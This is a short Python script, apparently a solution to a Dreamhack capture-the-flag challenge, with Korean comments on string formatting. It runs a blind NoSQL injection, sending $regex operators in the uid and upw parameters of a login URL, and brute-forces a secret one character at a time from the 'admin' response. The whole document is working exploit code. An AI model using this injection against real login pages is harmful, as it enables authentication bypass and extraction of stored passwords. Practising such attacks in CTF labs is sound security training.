import requests, string

HOST = "http://host3.dreamhack.games:22626"
ALPHANUMERIC = string.digits + string.ascii_letters  # 특수문자, 영문 소문자, 대문자
SUCCESS = "admin"
flag = ""
for i in range(32):
    for ch in ALPHANUMERIC:
        response = requests.get(
            f"{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}"  # flag를 적는 이유는 ch가 계속 바뀐다. 그래서 ch값을 flag값에 저장하는 용도로 사용한다. 그래야 flag값이 완성될 수 있다.
            # 문자열에 {을 포함하기 위해선 {{를 사용하라고 되어있습니다.
        )
        if response.text == SUCCESS:
            flag += ch
            break
    print(f"FLAG: DH{{{flag}}}")

